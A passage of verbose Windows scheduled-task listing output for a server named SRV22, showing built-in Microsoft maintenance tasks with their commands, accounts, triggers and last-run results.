Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:00:30
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Shell\IndexerAutomaticMaintenance
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Keeps the search index up to date
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Software Inventory Logging
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Software Inventory Logging\Collection
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd publish
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:10:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           3:00:00 AM
Start Date:                           1/1/2000
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        1 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Software Inventory Logging\Configuration
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:24:46 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd configure
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:02:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\SpacePort
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\SpacePort\SpaceAgentTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\SpaceAgent.exe
Start In:                             N/A
Comment:                              Storage Spaces Settings
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 06:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\SpacePort\SpaceAgentTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\SpaceAgent.exe
Start In:                             N/A
Comment:                              Storage Spaces Settings
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 06:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\SpacePort\SpaceManagerTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               $(@%SystemRoot%\system32\spaceman.exe,-2)
Task To Run:                          %windir%\system32\spaceman.exe /Work
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\spaceman.exe,-3)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\SpacePort\SpaceManagerTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               $(@%SystemRoot%\system32\spaceman.exe,-2)
Task To Run:                          %windir%\system32\spaceman.exe /Work
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\spaceman.exe,-3)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Speech
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Speech\HeadsetButtonPress
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\system32\speech_onecore\common\SpeechRuntime.exe StartedFromTask
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Speech\SpeechModelDownloadTask
Next Run Time:                        1/11/2026 3:35:13 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:13 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\speech_onecore\common\SpeechModelDownload.exe
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for 10 minutes, If Not Idle Retry For 10 minutes
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          NETWORK SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:10:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           12:00:00 AM
Start Date:                           1/1/2004
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\Storage Tiers Management
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Initializes the Storage Tiers Management service when the first tiered storage space is detected on the system. Do not remove or modify this task.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\defrag.exe -c -h -g -# -m 8 -i 13500
Start In:                             N/A
Comment:                              Optimizes the placement of data in storage tiers on all tiered storage spaces in the system.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           1:00:00 AM
Start Date:                           1/1/2013
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        4 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\TextServicesFramework
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              TextServicesFramework monitor task
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Time Synchronization
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Time Synchronization\ForceSynchronizeTime
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 9:42:42 AM
Last Result:                          -2147023829
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task performs time synchronization.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Time Synchronization\SynchronizeTime
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:14 AM
Last Result:                          1056
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\sc.exe start w32time task_started
Start In:                             N/A
Comment:                              Maintains date and time synchronization on all clients and servers in the network. If this service is stopped, date and time synchronization will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Time Zone
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Time Zone\SynchronizeTimeZone
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\tzsync.exe
Start In:                             N/A
Comment:                              Updates timezone information. If this task is stopped, local time may not be accurate for some time zones.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\UPnP
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\UPnP\UPnPHostConfig
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          sc.exe config upnphost start= auto
Start In:                             N/A
Comment:                              Set UPnPHost service to Auto-Start
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Windows Error Reporting
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        1/10/2026 1:29:01 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:26:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        1/10/2026 1:08:11 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:26:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        1/10/2026 1:23:53 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:26:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Windows Error Reporting\QueueReporting
Next Run Time:                        1/10/2026 1:08:31 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:26:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\wermgr.exe -upload
Start In:                             N/A
Comment:                              Windows Error Reporting task to process queued reports.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           4:00:00 PM
Start Date:                           12/31/2014
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 30 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\Windows Filtering Platform
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange
Start In:                             N/A
Comment:                              This task adjusts the start type for firewall-triggered services when the start type of the Base Filtering Engine (BFE) is disabled.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Windows Media Sharing
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Windows Media Sharing\UpdateLibrary
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          "%ProgramFiles%\Windows Media Player\wmpnscfg.exe"
Start In:                             N/A
Comment:                              This task updates the cached list of folders and the security permissions on any new files in a user's shared media library.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Authenticated Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\WindowsColorSystem
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task applies color calibration settings.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task applies color calibration settings.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\WindowsUpdate
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:34:36 AM
Last Result:                          1058
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only
Start Time:                           8:40:21 AM
Start Date:                           10/10/2024
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:34:36 AM
Last Result:                          1058
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:34:36 AM
Last Result:                          1058
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\WindowsUpdate\Scheduled Start
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:34:36 AM
Last Result:                          1058
Author:                               Microsoft Corporation.
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Start In:                             N/A
Comment:                              This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Wininet
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Wininet\CacheTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:46 AM
Last Result:                          1073807364
Author:                               Microsoft
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Wininet Cache Task
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Users
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Workplace Join
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:37 AM
Last Result:                          1
Author:                               N/A
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Start In:                             N/A
Comment:                              Register this computer if the computer is already joined to an Active Directory domain.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Workplace Join\Automatic-Device-Join
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/1/2024 9:36:37 AM
Last Result:                          1
Author:                               N/A
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Start In:                             N/A
Comment:                              Register this computer if the computer is already joined to an Active Directory domain.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:05:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        When an event occurs
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
